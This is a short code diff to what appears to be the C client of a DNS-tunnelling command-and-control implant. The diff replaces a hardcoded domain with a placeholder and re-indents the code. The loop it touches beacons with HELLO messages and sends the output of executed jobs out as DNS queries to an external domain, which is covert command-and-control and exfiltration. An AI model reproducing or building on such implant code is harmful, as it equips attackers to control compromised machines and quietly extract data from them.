@@ -9,7 +9,7 @@
 
 unsigned int napTime = 10;
 unsigned char *defaultHost = "993479018484841";
-unsigned char *defaultDomain = ".content.allyourcoffee.com";
+unsigned char *defaultDomain = ".subdomain.domain.com";
 
 void main(int argc, char *argv[])
 {
@@ -91,16 +91,16 @@ void main(int argc, char *argv[])
 		if(curJob != NULL)
 		{
 			sendBuff = createDnsQueryPacket(MESSAGE_TYPE_CMD_OUTPUT,
-												curJob->data,
-													defaultDomain,
-														&sendBuffSize);
+								curJob->data,
+									defaultDomain,
+								     		&sendBuffSize);
 		}
 		else
 		{
 			sendBuff = createDnsQueryPacket(MESSAGE_TYPE_HELLO,
-												"hhhhhhhhhhhhhhhhi",
-													defaultDomain,
-														&sendBuffSize);
+								"hhhhhhhhhhhhhhhhi",
+									defaultDomain,
+										&sendBuffSize);
 		}
 
 		sleep(napTime);
